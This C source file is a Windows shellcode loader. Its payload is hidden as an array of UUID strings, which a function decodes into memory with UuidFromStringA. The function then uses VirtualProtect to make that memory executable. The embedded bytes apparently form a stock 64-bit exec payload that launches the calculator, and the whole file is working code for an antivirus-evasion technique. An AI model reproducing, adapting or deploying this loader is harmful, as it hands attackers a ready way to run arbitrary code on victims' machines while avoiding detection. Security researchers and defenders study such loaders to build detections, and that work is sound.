#include <windows.h>
#include <rpc.h>
#pragma comment(lib,"Rpcrt4.lib")

const char* payload[] = {
    "e48348fc-e8f0-00c0-0000-415141505251",
    "d2314856-4865-528b-6048-8b5218488b52",
    "728b4820-4850-b70f-4a4a-4d31c94831c0",
    "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
    "48514152-528b-8b20-423c-4801d08b8088",
    "48000000-c085-6774-4801-d0508b481844",
    "4920408b-d001-56e3-48ff-c9418b348848",
    "314dd601-48c9-c031-ac41-c1c90d4101c1",
    "f175e038-034c-244c-0845-39d175d85844",
    "4924408b-d001-4166-8b0c-48448b401c49",
    "8b41d001-8804-0148-d041-5841585e595a",
    "59415841-5a41-8348-ec20-4152ffe05841",
    "8b485a59-e912-ff57-ffff-5d48ba010000",
    "00000000-4800-8d8d-0101-000041ba318b",
    "d5ff876f-e0bb-2a1d-0a41-baa695bd9dff",
    "c48348d5-3c28-7c06-0a80-fbe07505bb47",
    "6a6f7213-5900-8941-daff-d563616c6300"
};

const int payloadSz = 272;

LPVOID WriteUuidToMem()
{
    int uuid_len = 16;
    LPVOID pAddress = VirtualAlloc(NULL, payloadSz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (pAddress == NULL)
    {
        return (LPVOID)NULL;
    }
    DWORD_PTR hptr = (DWORD_PTR)pAddress;
    DWORD lpflOldProtect = 0;

    int elems = sizeof(payload) / sizeof(payload[0]);
    for (int i = 0; i < elems; i++)
    {
        RPC_CSTR StringUuid = (RPC_CSTR)payload[i];
        UUID* Uuid = (UUID*)hptr;
        RPC_STATUS status = UuidFromStringA(StringUuid, Uuid);
        if (status != RPC_S_OK)
        {
            return (LPVOID)NULL;
        }
        hptr += uuid_len;
    }

    if (VirtualProtect(pAddress, payloadSz, PAGE_EXECUTE_READ, &lpflOldProtect))
    {
        return pAddress;
    }
    else
    {
        return (LPVOID)pAddress;
    }
}